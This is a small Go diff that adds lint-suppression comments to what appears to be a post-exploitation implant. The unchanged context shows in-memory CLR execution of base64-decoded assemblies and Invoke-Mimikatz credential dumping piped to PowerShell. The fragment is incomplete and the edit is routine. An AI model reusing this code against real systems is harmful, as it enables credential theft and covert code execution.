@@ -183,8 +183,8 @@ func executeAssembly(b64Data string) (string, error) {
 	if useCLRHosting {
 		data, decErr := base64.StdEncoding.DecodeString(b64Data)
 		if decErr == nil {
-			out, clrErr := executeAssemblyInProcess(data, "")
-			if clrErr == nil {
+			out, clrErr := executeAssemblyInProcess(data, "") //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+			if clrErr == nil {                                //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 				return out, nil
 			}
 			if Debug {
@@ -264,8 +264,8 @@ func runMimikatz(command string, moduleB64 string) (string, error) {
 		// The module source defines Invoke-Mimikatz; dot-source it from the
 		// piped script, then invoke the requested command.
 		script := string(raw) + "\n" + fmt.Sprintf("$m = '%s'; $r = %s -Command $m; Write-Output $r", safeCmd, s(SInvokeMimikatz))
-		out, err := runPowerShellStdin(script)
-		if err != nil {
+		out, err := runPowerShellStdin(script) //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
+		if err != nil {                        //nolint:staticcheck // dual-GOOS dispatch: one target's impl makes this branch statically dead; the other can genuinely fail
 			return "", fmt.Errorf("%s failed: %w\nOutput: %s", s(SMimikatz), err, out)
 		}
 		return out, nil
